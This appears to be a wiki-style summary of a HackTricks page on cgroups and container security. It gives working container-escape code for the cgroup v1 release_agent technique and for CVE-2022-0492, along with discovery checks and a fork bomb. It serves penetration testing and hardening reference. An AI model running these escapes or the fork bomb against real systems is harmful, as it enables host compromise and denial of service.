---
title: "HackTricks — cgroups in Container Environments"
tags: [container-security, cgroups, privilege-escalation, hacktricks]
sources: [hacktricks-container-cgroups.md]
updated: 2026-05-01
---

# HackTricks — cgroups in Container Environments

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

cgroups matter for container security in two distinct ways: (1) missing resource limits enable denial-of-service, and (2) writable **cgroup v1** interfaces have historically created host escape primitives — most notably `release_agent`. cgroup v2 is much cleaner and most famous v1 escapes do not apply.

## v1 vs v2

```bash
stat -fc %T /sys/fs/cgroup   # cgroup2fs = v2, tmpfs = v1
mount | grep cgroup
```

On cgroup v2 (`cgroup2fs`): unified hierarchy, cleaner behavior, `release_agent` does not exist.

## The `release_agent` Breakout (cgroup v1 only)

When the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the path stored in `release_agent` **in the initial namespaces on the host** — that's what makes it an escape primitive.

Requirements: writable cgroup v1 hierarchy, ability to set `notify_on_release`, control of `release_agent` path, path resolves to executable from host's view.

### Classic PoC (condensed)

```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # or memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd

sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1 && cat /output
```

### Relative path variant (when host overlay path unknown)

```bash
# Brute-force /proc/<pid>/root/<payload> as release_agent path
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > /tmp/cgrp/release_agent
```

`/proc/<pid>/root/...` lets the kernel resolve container files from host namespace without knowing the direct storage path.

### CVE-2022-0492

Missing `CAP_SYS_ADMIN` check in initial user namespace for writing `release_agent`. On vulnerable kernels, a container that can mount a cgroup hierarchy can write `release_agent` without host-level privileges:

```bash
unshare -UrCm sh -c '
  mkdir /tmp/c && mount -t cgroup -o memory none /tmp/c
  echo 1 > /tmp/c/notify_on_release
  echo /proc/self/exe > /tmp/c/release_agent
  (sleep 1; echo 0 > /tmp/c/cgroup.procs) &
  while true; do sleep 1; done
'
```

## Discovery Checks

```bash
cat /proc/self/cgroup
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
# Resource limits (DoS viability)
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```

Key signals:

- cgroup v1 mounts → older breakout writeups become relevant
- Writable `release_agent` → immediately investigate further
- Missing `pids.max` / `memory.max` → DoS via fork bomb or memory exhaustion is realistic

## Resource Exhaustion (Blast Radius)

Without cgroup limits, code execution can degrade the host:

```bash
# fork bomb
:(){ :|:& };:
# memory pressure
stress-ng --vm 1 --vm-bytes 1G --verify -t 5m
```

## Runtime Defaults Table

| Runtime          | Default state                                                         | Common weakening                                                          |
| ---------------- | --------------------------------------------------------------------- | ------------------------------------------------------------------------- |
| Docker Engine    | Containers placed in cgroups automatically; limits optional           | Omitting `--memory`, `--pids-limit`, `--cpus`; `--device`; `--privileged` |
| Podman           | `--cgroups=enabled` default; cgroup ns: `private` on v2, varies on v1 | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access            |
| Kubernetes       | Pods/containers placed in cgroups by node runtime                     | Omitting resource requests/limits, privileged device access               |
| containerd/CRI-O | Enabled by default as part of lifecycle                               | Direct runtime configs exposing writable cgroup v1 interfaces             |

**Key distinction:** cgroup existence is usually default; **useful resource constraints** are often optional unless explicitly configured.

## Related Pages

- [Container Security](../concepts/container-security.md)
- [HackTricks — Container Assessment and Hardening](hacktricks-assessment-and-hardening.md)
- [HackTricks — Privileged Containers](hacktricks-privileged-containers.md)
- [HackTricks](../entities/hacktricks.md)
